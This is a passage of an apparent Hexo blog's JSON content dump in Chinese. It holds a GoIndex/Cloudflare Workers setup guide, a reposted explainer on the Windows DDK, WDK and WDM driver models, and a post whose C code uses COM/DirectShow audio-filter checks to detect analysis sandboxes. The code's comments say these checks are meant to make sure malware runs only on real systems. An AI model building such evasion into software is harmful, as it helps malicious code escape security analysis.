代码生成\"></a>GoIndex 代码生成</h3><p>访问 <a href=\"https://install.gd.workers.dev/\" target=\"_blank\" rel=\"noopener\">https://install.gd.workers.dev/</a></p>\n<ol>\n<li><p>获取认证码，都是点点点，复制粘贴</p>\n</li>\n<li><p>目录可以默认</p>\n</li>\n<li><p>密码可以自己设置，但是要记住</p>\n</li>\n<li><p>点击生成代码，这个代码要部署到cloudflare中</p>\n</li>\n<li><p>这个时候点击 <a href=\"https://dash.cloudflare.com/\" target=\"_blank\" rel=\"noopener\">https://dash.cloudflare.com/</a></p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328110246292.png\" srcset=\"/cray/img/loading.gif\" alt></p>\n</li>\n<li><p>自行注册，账号没有要求。登录后点击如下地址</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328110413035.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200328110413035\"></p>\n</li>\n<li><p>创建新的，贴上之前生成的js代码，然后修改root如下，然后保存部署</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328110948928.png\" srcset=\"/cray/img/loading.gif\" alt></p>\n</li>\n<li><p>访问右侧的链接，会叫填入密码，密码就是第3步设置的</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328111301819.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200328111301819\"></p>\n</li>\n<li><p>复制它的链接，打开下载工具，迅雷，IDM，Motrix等都可以</p>\n<p>我这里用Motrix测试，家里带宽50M</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328113104155.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200328113104155\"></p>\n<p>去测一下<a href=\"https://www.speedtest.cn/下载带宽，基本就等于这里的下载速度了。\" target=\"_blank\" rel=\"noopener\">https://www.speedtest.cn/下载带宽，基本就等于这里的下载速度了。</a></p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200328112645982.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200328112645982\"></p>\n</li>\n</ol>\n"},{"title":"Com组建检测虚拟沙箱","index_img":"https://w.wallhaven.cc/full/2k/wallhaven-2kmoxm.jpg","banner_img":"https://w.wallhaven.cc/full/2k/wallhaven-2kmoxm.jpg","date":"2019-09-04T11:11:22.000Z","_content":"\n\n因为沙箱的仿真度不全问题，可能造成仿真系统上的音频设备功能与真机的差异，通过这来实现检测是否在沙箱中运行。\n\n但经测试 `any.run` 和`微步` 都未被识别为沙箱\n\n这里只是介绍下可以使用COM对系统基础设备的操作，来检测虚拟沙箱。\n```c\n#include \"stdafx.h\"\n#include <conio.h>\n#include <windows.h>\n#include <dshow.h>\n#include <objbase.h>\n\n#pragma comment(lib, \"Strmiids.lib\")\n\nvoid useCom()\n{\n\t/*\n\t这些只是一些随机检查，以确保恶意软件在真实系统上执行。\n\t只有安装了音频设备，此处的沙箱才会被视为真实系统。\n\t大多数仿真器都会失败，因为几乎不可能为现代操作系统中的每个COM接口实现适当的支持。\n\t*/\n\tCoInitialize(0);\n\twchar_t * filerName = L\"random_name\";\n\tIGraphBuilder * pGraph;\n\tCoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (void**)&pGraph);\n\tif (E_POINTER != pGraph->AddFilter(NULL, filerName))\n\t{\n\t\tMessageBox(0,L\"E_POINTER != pGraph->AddFilter\",0,0);\n\t\tExitProcess(-1);\n\t}\n\n\t//对一个简单的音频渲染器进行硝化，不检查错误代码，但是失败后pBaseFilter将被设置为NULL\n\tIBaseFilter *pBaseFile;\n\tCoCreateInstance(CLSID_AudioRender, NULL, CLSCTX_INPROC_SERVER, IID_IBaseFilter, (void**)&pBaseFile);\n\n\t//试图找到刚刚添加的过滤器;如果以前未检查任何错误（或错误的仿真），此功能将无法找到过滤器，并且将成功检测到沙箱/仿真器。\n\tpGraph->AddFilter(pBaseFile, filerName);\n\tIBaseFilter *pBaseFile2;\n\tpGraph->FindFilterByName(filerName, &pBaseFile2);\n\n\tif (pBaseFile2 == NULL)\n\t{\n\t\tMessageBox(0,L\"pBaseFile2==Null!!!\",0,0);\n\t\tExitProcess(1);\n\t}\n\t//检查achName是不是之前添加的过滤器名\n\tFILTER_INFO info = { 0 };\n\tpBaseFile2->QueryFilterInfo(&info);\n\tif (wcscmp(info.achName,filerName)!=0)\n\t{\n\t\tMessageBox(0,L\"pBaseFile2 AddFilter error\",0,0);\n\t\texit(0);\n\t}\n\n\tIReferenceClock *pClock;\n\tif (pBaseFile2->GetSyncSource(&pClock))\n\t{\n\t\tMessageBox(0,L\"pBaseFile2->GetSyncSource\",0,0);\n\t\texit(0);\n\t}\n\tif (pClock != NULL)\n\t{\n\t\texit(0);\n\t}\n\tCLSID clsID;\n\tpBaseFile2->GetClassID(&clsID);\n\tif (clsID.Data1 == 0)\n\t{\n\t\tMessageBox(0,L\"pBaseFile2->GetClassID\",0,0);\n\t\texit(1);\n\t}\n\tif (pBaseFile2 ==NULL)\n\t{\n\t\tMessageBox(0,L\"pBaseFile2 ==NULL\",0,0);\n\t\texit(1);\n\t}\n\n\tIEnumPins *pEnum = NULL;\n\tif (pBaseFile2->EnumPins(&pEnum)!=0)\n\t{\n\t\tMessageBox(0,L\"pBaseFile2->EnumPins\",0,0);\n\t\texit(-1);\n\t}\n\t//AddRef返回的引用计数必须大于0\n\tif (pBaseFile2->AddRef() == 0)\n\t{\n\t\tMessageBox(0,L\"pBaseFile2->AddRef()\",0,0);\n\t\texit(-1);\n\t}\n}\n\nint _tmain(int argc, _TCHAR* argv[])\n{\n\tuseCom();\n\tMessageBox(0,L\"没有沙箱!!!\\n\",0,0);\n\n\treturn 0;\n}\n```\nIDA反编译结果\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190905142026524.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70)\n","source":"_posts/Com添加过滤器来检测沙箱.md","raw":"---\ntitle: Com组建检测虚拟沙箱\nindex_img: https://w.wallhaven.cc/full/2k/wallhaven-2kmoxm.jpg\nbanner_img: https://w.wallhaven.cc/full/2k/wallhaven-2kmoxm.jpg\ndate: 2019-09-04 19:11:22\ntags:\n    - 检测沙箱\ncategories: 逆向\n---\n\n\n因为沙箱的仿真度不全问题，可能造成仿真系统上的音频设备功能与真机的差异，通过这来实现检测是否在沙箱中运行。\n\n但经测试 `any.run` 和`微步` 都未被识别为沙箱\n\n这里只是介绍下可以使用COM对系统基础设备的操作，来检测虚拟沙箱。\n```c\n#include \"stdafx.h\"\n#include <conio.h>\n#include <windows.h>\n#include <dshow.h>\n#include <objbase.h>\n\n#pragma comment(lib, \"Strmiids.lib\")\n\nvoid useCom()\n{\n\t/*\n\t这些只是一些随机检查，以确保恶意软件在真实系统上执行。\n\t只有安装了音频设备，此处的沙箱才会被视为真实系统。\n\t大多数仿真器都会失败，因为几乎不可能为现代操作系统中的每个COM接口实现适当的支持。\n\t*/\n\tCoInitialize(0);\n\twchar_t * filerName = L\"random_name\";\n\tIGraphBuilder * pGraph;\n\tCoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (void**)&pGraph);\n\tif (E_POINTER != pGraph->AddFilter(NULL, filerName))\n\t{\n\t\tMessageBox(0,L\"E_POINTER != pGraph->AddFilter\",0,0);\n\t\tExitProcess(-1);\n\t}\n\n\t//对一个简单的音频渲染器进行硝化，不检查错误代码，但是失败后pBaseFilter将被设置为NULL\n\tIBaseFilter *pBaseFile;\n\tCoCreateInstance(CLSID_AudioRender, NULL, CLSCTX_INPROC_SERVER, IID_IBaseFilter, (void**)&pBaseFile);\n\n\t//试图找到刚刚添加的过滤器;如果以前未检查任何错误（或错误的仿真），此功能将无法找到过滤器，并且将成功检测到沙箱/仿真器。\n\tpGraph->AddFilter(pBaseFile, filerName);\n\tIBaseFilter *pBaseFile2;\n\tpGraph->FindFilterByName(filerName, &pBaseFile2);\n\n\tif (pBaseFile2 == NULL)\n\t{\n\t\tMessageBox(0,L\"pBaseFile2==Null!!!\",0,0);\n\t\tExitProcess(1);\n\t}\n\t//检查achName是不是之前添加的过滤器名\n\tFILTER_INFO info = { 0 };\n\tpBaseFile2->QueryFilterInfo(&info);\n\tif (wcscmp(info.achName,filerName)!=0)\n\t{\n\t\tMessageBox(0,L\"pBaseFile2 AddFilter error\",0,0);\n\t\texit(0);\n\t}\n\n\tIReferenceClock *pClock;\n\tif (pBaseFile2->GetSyncSource(&pClock))\n\t{\n\t\tMessageBox(0,L\"pBaseFile2->GetSyncSource\",0,0);\n\t\texit(0);\n\t}\n\tif (pClock != NULL)\n\t{\n\t\texit(0);\n\t}\n\tCLSID clsID;\n\tpBaseFile2->GetClassID(&clsID);\n\tif (clsID.Data1 == 0)\n\t{\n\t\tMessageBox(0,L\"pBaseFile2->GetClassID\",0,0);\n\t\texit(1);\n\t}\n\tif (pBaseFile2 ==NULL)\n\t{\n\t\tMessageBox(0,L\"pBaseFile2 ==NULL\",0,0);\n\t\texit(1);\n\t}\n\n\tIEnumPins *pEnum = NULL;\n\tif (pBaseFile2->EnumPins(&pEnum)!=0)\n\t{\n\t\tMessageBox(0,L\"pBaseFile2->EnumPins\",0,0);\n\t\texit(-1);\n\t}\n\t//AddRef返回的引用计数必须大于0\n\tif (pBaseFile2->AddRef() == 0)\n\t{\n\t\tMessageBox(0,L\"pBaseFile2->AddRef()\",0,0);\n\t\texit(-1);\n\t}\n}\n\nint _tmain(int argc, _TCHAR* argv[])\n{\n\tuseCom();\n\tMessageBox(0,L\"没有沙箱!!!\\n\",0,0);\n\n\treturn 0;\n}\n```\nIDA反编译结果\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190905142026524.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70)\n","slug":"Com添加过滤器来检测沙箱","published":1,"updated":"2019-10-29T10:54:50.623Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckhiiw61y000hccuqns81c7ff","content":"<p>因为沙箱的仿真度不全问题，可能造成仿真系统上的音频设备功能与真机的差异，通过这来实现检测是否在沙箱中运行。</p>\n<p>但经测试 <code>any.run</code> 和<code>微步</code> 都未被识别为沙箱</p>\n<p>这里只是介绍下可以使用COM对系统基础设备的操作，来检测虚拟沙箱。</p>\n<pre><code class=\"c\">#include &quot;stdafx.h&quot;\n#include &lt;conio.h&gt;\n#include &lt;windows.h&gt;\n#include &lt;dshow.h&gt;\n#include &lt;objbase.h&gt;\n\n#pragma comment(lib, &quot;Strmiids.lib&quot;)\n\nvoid useCom()\n{\n    /*\n    这些只是一些随机检查，以确保恶意软件在真实系统上执行。\n    只有安装了音频设备，此处的沙箱才会被视为真实系统。\n    大多数仿真器都会失败，因为几乎不可能为现代操作系统中的每个COM接口实现适当的支持。\n    */\n    CoInitialize(0);\n    wchar_t * filerName = L&quot;random_name&quot;;\n    IGraphBuilder * pGraph;\n    CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (void**)&amp;pGraph);\n    if (E_POINTER != pGraph-&gt;AddFilter(NULL, filerName))\n    {\n        MessageBox(0,L&quot;E_POINTER != pGraph-&gt;AddFilter&quot;,0,0);\n        ExitProcess(-1);\n    }\n\n    //对一个简单的音频渲染器进行硝化，不检查错误代码，但是失败后pBaseFilter将被设置为NULL\n    IBaseFilter *pBaseFile;\n    CoCreateInstance(CLSID_AudioRender, NULL, CLSCTX_INPROC_SERVER, IID_IBaseFilter, (void**)&amp;pBaseFile);\n\n    //试图找到刚刚添加的过滤器;如果以前未检查任何错误（或错误的仿真），此功能将无法找到过滤器，并且将成功检测到沙箱/仿真器。\n    pGraph-&gt;AddFilter(pBaseFile, filerName);\n    IBaseFilter *pBaseFile2;\n    pGraph-&gt;FindFilterByName(filerName, &amp;pBaseFile2);\n\n    if (pBaseFile2 == NULL)\n    {\n        MessageBox(0,L&quot;pBaseFile2==Null!!!&quot;,0,0);\n        ExitProcess(1);\n    }\n    //检查achName是不是之前添加的过滤器名\n    FILTER_INFO info = { 0 };\n    pBaseFile2-&gt;QueryFilterInfo(&amp;info);\n    if (wcscmp(info.achName,filerName)!=0)\n    {\n        MessageBox(0,L&quot;pBaseFile2 AddFilter error&quot;,0,0);\n        exit(0);\n    }\n\n    IReferenceClock *pClock;\n    if (pBaseFile2-&gt;GetSyncSource(&amp;pClock))\n    {\n        MessageBox(0,L&quot;pBaseFile2-&gt;GetSyncSource&quot;,0,0);\n        exit(0);\n    }\n    if (pClock != NULL)\n    {\n        exit(0);\n    }\n    CLSID clsID;\n    pBaseFile2-&gt;GetClassID(&amp;clsID);\n    if (clsID.Data1 == 0)\n    {\n        MessageBox(0,L&quot;pBaseFile2-&gt;GetClassID&quot;,0,0);\n        exit(1);\n    }\n    if (pBaseFile2 ==NULL)\n    {\n        MessageBox(0,L&quot;pBaseFile2 ==NULL&quot;,0,0);\n        exit(1);\n    }\n\n    IEnumPins *pEnum = NULL;\n    if (pBaseFile2-&gt;EnumPins(&amp;pEnum)!=0)\n    {\n        MessageBox(0,L&quot;pBaseFile2-&gt;EnumPins&quot;,0,0);\n        exit(-1);\n    }\n    //AddRef返回的引用计数必须大于0\n    if (pBaseFile2-&gt;AddRef() == 0)\n    {\n        MessageBox(0,L&quot;pBaseFile2-&gt;AddRef()&quot;,0,0);\n        exit(-1);\n    }\n}\n\nint _tmain(int argc, _TCHAR* argv[])\n{\n    useCom();\n    MessageBox(0,L&quot;没有沙箱!!!\\n&quot;,0,0);\n\n    return 0;\n}</code></pre>\n<p>IDA反编译结果</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190905142026524.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n","site":{"data":{}},"excerpt":"","more":"<p>因为沙箱的仿真度不全问题，可能造成仿真系统上的音频设备功能与真机的差异，通过这来实现检测是否在沙箱中运行。</p>\n<p>但经测试 <code>any.run</code> 和<code>微步</code> 都未被识别为沙箱</p>\n<p>这里只是介绍下可以使用COM对系统基础设备的操作，来检测虚拟沙箱。</p>\n<pre><code class=\"c\">#include &quot;stdafx.h&quot;\n#include &lt;conio.h&gt;\n#include &lt;windows.h&gt;\n#include &lt;dshow.h&gt;\n#include &lt;objbase.h&gt;\n\n#pragma comment(lib, &quot;Strmiids.lib&quot;)\n\nvoid useCom()\n{\n    /*\n    这些只是一些随机检查，以确保恶意软件在真实系统上执行。\n    只有安装了音频设备，此处的沙箱才会被视为真实系统。\n    大多数仿真器都会失败，因为几乎不可能为现代操作系统中的每个COM接口实现适当的支持。\n    */\n    CoInitialize(0);\n    wchar_t * filerName = L&quot;random_name&quot;;\n    IGraphBuilder * pGraph;\n    CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (void**)&amp;pGraph);\n    if (E_POINTER != pGraph-&gt;AddFilter(NULL, filerName))\n    {\n        MessageBox(0,L&quot;E_POINTER != pGraph-&gt;AddFilter&quot;,0,0);\n        ExitProcess(-1);\n    }\n\n    //对一个简单的音频渲染器进行硝化，不检查错误代码，但是失败后pBaseFilter将被设置为NULL\n    IBaseFilter *pBaseFile;\n    CoCreateInstance(CLSID_AudioRender, NULL, CLSCTX_INPROC_SERVER, IID_IBaseFilter, (void**)&amp;pBaseFile);\n\n    //试图找到刚刚添加的过滤器;如果以前未检查任何错误（或错误的仿真），此功能将无法找到过滤器，并且将成功检测到沙箱/仿真器。\n    pGraph-&gt;AddFilter(pBaseFile, filerName);\n    IBaseFilter *pBaseFile2;\n    pGraph-&gt;FindFilterByName(filerName, &amp;pBaseFile2);\n\n    if (pBaseFile2 == NULL)\n    {\n        MessageBox(0,L&quot;pBaseFile2==Null!!!&quot;,0,0);\n        ExitProcess(1);\n    }\n    //检查achName是不是之前添加的过滤器名\n    FILTER_INFO info = { 0 };\n    pBaseFile2-&gt;QueryFilterInfo(&amp;info);\n    if (wcscmp(info.achName,filerName)!=0)\n    {\n        MessageBox(0,L&quot;pBaseFile2 AddFilter error&quot;,0,0);\n        exit(0);\n    }\n\n    IReferenceClock *pClock;\n    if (pBaseFile2-&gt;GetSyncSource(&amp;pClock))\n    {\n        MessageBox(0,L&quot;pBaseFile2-&gt;GetSyncSource&quot;,0,0);\n        exit(0);\n    }\n    if (pClock != NULL)\n    {\n        exit(0);\n    }\n    CLSID clsID;\n    pBaseFile2-&gt;GetClassID(&amp;clsID);\n    if (clsID.Data1 == 0)\n    {\n        MessageBox(0,L&quot;pBaseFile2-&gt;GetClassID&quot;,0,0);\n        exit(1);\n    }\n    if (pBaseFile2 ==NULL)\n    {\n        MessageBox(0,L&quot;pBaseFile2 ==NULL&quot;,0,0);\n        exit(1);\n    }\n\n    IEnumPins *pEnum = NULL;\n    if (pBaseFile2-&gt;EnumPins(&amp;pEnum)!=0)\n    {\n        MessageBox(0,L&quot;pBaseFile2-&gt;EnumPins&quot;,0,0);\n        exit(-1);\n    }\n    //AddRef返回的引用计数必须大于0\n    if (pBaseFile2-&gt;AddRef() == 0)\n    {\n        MessageBox(0,L&quot;pBaseFile2-&gt;AddRef()&quot;,0,0);\n        exit(-1);\n    }\n}\n\nint _tmain(int argc, _TCHAR* argv[])\n{\n    useCom();\n    MessageBox(0,L&quot;没有沙箱!!!\\n&quot;,0,0);\n\n    return 0;\n}</code></pre>\n<p>IDA反编译结果</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190905142026524.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n"},{"title":"DDK与WDK WDM的区别","index_img":"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216120944.png","banner_img":"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216120944.png","date":"2019-11-18T14:28:01.000Z","_content":"\n\n自己总结如下：\n\n\n![20191216121033.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216121033.png)\n\n![image.png](https://upload.wikimedia.org/wikipedia/commons/thumb/6/6d/Windows_Updated_Family_Tree.png/1920px-Windows_Updated_Family_Tree.png)\n\n\n\n转载自：http://blog.sina.com.cn/s/blog_4b9eab320101b6yn.html\n\n\n1.首先，先从基础的东西说起，开发WINDOWS下的驱动程序，需要一个专门的开发包，如：开发JAVA程序，我们可能需要一个JDK，开发WINDOWS应用程序，我们需要WINDOWS的SDK，现在开发WINDOWS下的驱动程序，我们需要一个DDK/WDK。\n\n2.DDK（Driver Developer Kit）和WDK（Windows Driver Kit）的区别：\n\n这个要说说驱动相关的一些历史:\n\n\t1).95/98/ME下，驱动模型为：Vxd，相关资料可以看《编程高手箴言》的前几个章节，里面有很详细的介绍，虽然这个东西已经过时，但大概看看还是会增长见识的。\n\n\t2).2000/XP/2003下，Windows采用WDM驱动模型（Windows Driver Model），开发2000/XP/2003的驱动开发包为：DDK。\n\n\tWDM驱动无非是微软在NT式驱动之上进行了扩充，过滤驱动也不例外 。\n\n\t3).Vista及以后版本，采用了WDF驱动模型（Windows Driver Foudation），对应的开发包：WDK。\n\n其实**WDK可以看做是DDK的升级版本，现在一般的WDK是包含以前DDK相关的功能，现在XP下也可以用WDK开发驱动，WDK能编译出2000-2008的各种驱动**。\n\n3.Vxd驱动文件扩展名为：.vxd。\n\nWDM和WDF驱动文件扩展名为：.sys。\n\n4、WDM 是 Win32设备驱动程序体系结构。\n\n件驱动的驱动程序开发框架，大大降低了开发难度。从现在开始，掌握Windows设备驱动程序的开发人员，由过去的“专业”人士，将变为“普通”大众。\n\nWDF驱动程序包括两个类型，一个是内核级的，称为KMDF（Kernel-Mode Driver Framework），为SYS文件；另一个是用户级的，称为UMDF（User-Mode Driver Framework），为DLL文件。\n\n\n5、DDK 和WDK\n\n**DDK是基于wdm驱动模型的，而WDK是基于WDF驱动模型的**，wdm驱动模型和wdf驱动模型的最大的区别是：\n\n\t1)wdf驱动框架对WDM进行了一次封装，WDF框架就好像C++中的基类一样，且这个基类中的model,IO model ,pnp和电源管理模型;且提供了一些与操作系统相关的处理函数，这些函数好像C++中的虚函数一样，WDF驱动中能够对这些函数进行override；特别是Pnp管理和电源管理！基本上都由WDF框架做了，而WDF的功能驱动几乎不要对它进行特殊的处理；\n\n\t2)WDF驱动模型 与WDM驱动模型的另外一个主要区别是：\n\n\tWDF 驱动采用队列进行IO处理，而WDM中将所有的IO操作都用默认的队列进行处理，如果要进行IRp同步，必须使用StartIO；\n\n\t3)WDF是面向对象的，而WDM是面向过程的，WDF提供对象的封装，如将IRP封装成WDFREQUEST，对象提供方法和Event。\n\n\t5）usb设备的读写；\n\n\t当应用程序使用ReadFile或WriteFile进行读写时，首先将\n\n\tUsbBuildInterruptOrBulkTransferRequest将构建urb请求，然后通过IoCallDriver发送给底层usb 总线驱动；\n\n\t对于WDF来说，WdfUsbTargetPipeFormatRequestForRead 格式化读请求，然后使用WdfRequestSend  发送给底层Usb总线驱动；\n\n\t对WDM和WDF的usb的读写都可以设置完成例程；","source":"_posts/DDK与WDK WDM的区别.md","raw":"---\ntitle: DDK与WDK WDM的区别\ntags: [内核, 驱动学习]\nindex_img: https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216120944.png\nbanner_img: https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216120944.png\ndate: 2019-11-18 22:28:01\n---\n\n\n自己总结如下：\n\n\n![20191216121033.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216121033.png)\n\n![image.png](https://upload.wikimedia.org/wikipedia/commons/thumb/6/6d/Windows_Updated_Family_Tree.png/1920px-Windows_Updated_Family_Tree.png)\n\n\n\n转载自：http://blog.sina.com.cn/s/blog_4b9eab320101b6yn.html\n\n\n1.首先，先从基础的东西说起，开发WINDOWS下的驱动程序，需要一个专门的开发包，如：开发JAVA程序，我们可能需要一个JDK，开发WINDOWS应用程序，我们需要WINDOWS的SDK，现在开发WINDOWS下的驱动程序，我们需要一个DDK/WDK。\n\n2.DDK（Driver Developer Kit）和WDK（Windows Driver Kit）的区别：\n\n这个要说说驱动相关的一些历史:\n\n\t1).95/98/ME下，驱动模型为：Vxd，相关资料可以看《编程高手箴言》的前几个章节，里面有很详细的介绍，虽然这个东西已经过时，但大概看看还是会增长见识的。\n\n\t2).2000/XP/2003下，Windows采用WDM驱动模型（Windows Driver Model），开发2000/XP/2003的驱动开发包为：DDK。\n\n\tWDM驱动无非是微软在NT式驱动之上进行了扩充，过滤驱动也不例外 。\n\n\t3).Vista及以后版本，采用了WDF驱动模型（Windows Driver Foudation），对应的开发包：WDK。\n\n其实**WDK可以看做是DDK的升级版本，现在一般的WDK是包含以前DDK相关的功能，现在XP下也可以用WDK开发驱动，WDK能编译出2000-2008的各种驱动**。\n\n3.Vxd驱动文件扩展名为：.vxd。\n\nWDM和WDF驱动文件扩展名为：.sys。\n\n4、WDM 是 Win32设备驱动程序体系结构。\n\n件驱动的驱动程序开发框架，大大降低了开发难度。从现在开始，掌握Windows设备驱动程序的开发人员，由过去的“专业”人士，将变为“普通”大众。\n\nWDF驱动程序包括两个类型，一个是内核级的，称为KMDF（Kernel-Mode Driver Framework），为SYS文件；另一个是用户级的，称为UMDF（User-Mode Driver Framework），为DLL文件。\n\n\n5、DDK 和WDK\n\n**DDK是基于wdm驱动模型的，而WDK是基于WDF驱动模型的**，wdm驱动模型和wdf驱动模型的最大的区别是：\n\n\t1)wdf驱动框架对WDM进行了一次封装，WDF框架就好像C++中的基类一样，且这个基类中的model,IO model ,pnp和电源管理模型;且提供了一些与操作系统相关的处理函数，这些函数好像C++中的虚函数一样，WDF驱动中能够对这些函数进行override；特别是Pnp管理和电源管理！基本上都由WDF框架做了，而WDF的功能驱动几乎不要对它进行特殊的处理；\n\n\t2)WDF驱动模型 与WDM驱动模型的另外一个主要区别是：\n\n\tWDF 驱动采用队列进行IO处理，而WDM中将所有的IO操作都用默认的队列进行处理，如果要进行IRp同步，必须使用StartIO；\n\n\t3)WDF是面向对象的，而WDM是面向过程的，WDF提供对象的封装，如将IRP封装成WDFREQUEST，对象提供方法和Event。\n\n\t5）usb设备的读写；\n\n\t当应用程序使用ReadFile或WriteFile进行读写时，首先将\n\n\tUsbBuildInterruptOrBulkTransferRequest将构建urb请求，然后通过IoCallDriver发送给底层usb 总线驱动；\n\n\t对于WDF来说，WdfUsbTargetPipeFormatRequestForRead 格式化读请求，然后使用WdfRequestSend  发送给底层Usb总线驱动；\n\n\t对WDM和WDF的usb的读写都可以设置完成例程；","slug":"DDK与WDK WDM的区别","published":1,"updated":"2019-12-16T04:10:45.513Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckhiiw61y000iccuqjgtabq88","content":"<p>自己总结如下：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216121033.png\" srcset=\"/cray/img/loading.gif\" alt=\"20191216121033.png\"></p>\n<p><img src=\"https://upload.wikimedia.org/wikipedia/commons/thumb/6/6d/Windows_Updated_Family_Tree.png/1920px-Windows_Updated_Family_Tree.png\" srcset=\"/cray/img/loading.gif\" alt=\"image.png\"></p>\n<p>转载自：<a href=\"http://blog.sina.com.cn/s/blog_4b9eab320101b6yn.html\" target=\"_blank\" rel=\"noopener\">http://blog.sina.com.cn/s/blog_4b9eab320101b6yn.html</a></p>\n<p>1.首先，先从基础的东西说起，开发WINDOWS下的驱动程序，需要一个专门的开发包，如：开发JAVA程序，我们可能需要一个JDK，开发WINDOWS应用程序，我们需要WINDOWS的SDK，现在开发WINDOWS下的驱动程序，我们需要一个DDK/WDK。</p>\n<p>2.DDK（Driver Developer Kit）和WDK（Windows Driver Kit）的区别：</p>\n<p>这个要说说驱动相关的一些历史:</p>\n<pre><code>1).95/98/ME下，驱动模型为：Vxd，相关资料可以看《编程高手箴言》的前几个章节，里面有很详细的介绍，虽然这个东西已经过时，但大概看看还是会增长见识的。\n\n2).2000/XP/2003下，Windows采用WDM驱动模型（Windows Driver Model），开发2000/XP/2003的驱动开发包为：DDK。\n\nWDM驱动无非是微软在NT式驱动之上进行了扩充，过滤驱动也不例外 。\n\n3).Vista及以后版本，采用了WDF驱动模型（Windows Driver Foudation），对应的开发包：WDK。</code></pre><p>其实<strong>WDK可以看做是DDK的升级版本，现在一般的WDK是包含以前DDK相关的功能，现在XP下也可以用WDK开发驱动，WDK能编译出2000-2008的各种驱动</strong>。</p>\n<p>3.Vxd驱动文件扩展名为：.vxd。</p>\n<p>WDM和WDF驱动文件扩展名为：.sys。</p>\n<p>4、WDM 是 Win32设备驱动程序体系结构。</p>\n<p>件驱动的驱动程序开发框架，大大降低了开发难度。从现在开始，掌握Windows设备驱动程序的开发人员，由过去的“专业”人士，将变为“普通”大众。</p>\n<p>WDF驱动程序包括两个类型，一个是内核级的，称为KMDF（Kernel-Mode Driver Framework），为SYS文件；另一个是用户级的，称为UMDF（User-Mode Driver Framework），为DLL文件。</p>\n<p>5、DDK 和WDK</p>\n<p><strong>DDK是基于wdm驱动模型的，而WDK是基于WDF驱动模型的</strong>，wdm驱动模型和wdf驱动模型的最大的区别是：</p>\n<pre><code>1)wdf驱动框架对WDM进行了一次封装，WDF框架就好像C++中的基类一样，且这个基类中的model,IO model ,pnp和电源管理模型;且提供了一些与操作系统相关的处理函数，这些函数好像C++中的虚函数一样，WDF驱动中能够对这些函数进行override；特别是Pnp管理和电源管理！基本上都由WDF框架做了，而WDF的功能驱动几乎不要对它进行特殊的处理；\n\n2)WDF驱动模型 与WDM驱动模型的另外一个主要区别是：\n\nWDF 驱动采用队列进行IO处理，而WDM中将所有的IO操作都用默认的队列进行处理，如果要进行IRp同步，必须使用StartIO；\n\n3)WDF是面向对象的，而WDM是面向过程的，WDF提供对象的封装，如将IRP封装成WDFREQUEST，对象提供方法和Event。\n\n5）usb设备的读写；\n\n当应用程序使用ReadFile或WriteFile进行读写时，首先将\n\nUsbBuildInterruptOrBulkTransferRequest将构建urb请求，然后通过IoCallDriver发送给底层usb 总线驱动；\n\n对于WDF来说，WdfUsbTargetPipeFormatRequestForRead 格式化读请求，然后使用WdfRequestSend  发送给底层Usb总线驱动；\n\n对WDM和WDF的usb的读写都可以设置完成例程；</code></pre>","site":{"data":{}},"excerpt":"","more":"<p>自己总结如下：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216121033.png\" srcset=\"/cray/img/loading.gif\" alt=\"20191216121033.png\"></p>\n<p><img src=\"https://upload.wikimedia.org/wikipedia/commons/thumb/6/6d/Windows_Updated_Family_Tree.png/1920px-Windows_Updated_Family_Tree.png\" srcset=\"/cray/img/loading.gif\" alt=\"image.png\"></p>\n<p>转载自：<a href=\"http://blog.sina.com.cn/s/blog_4b9eab320101b6yn.html\" target=\"_blank\" 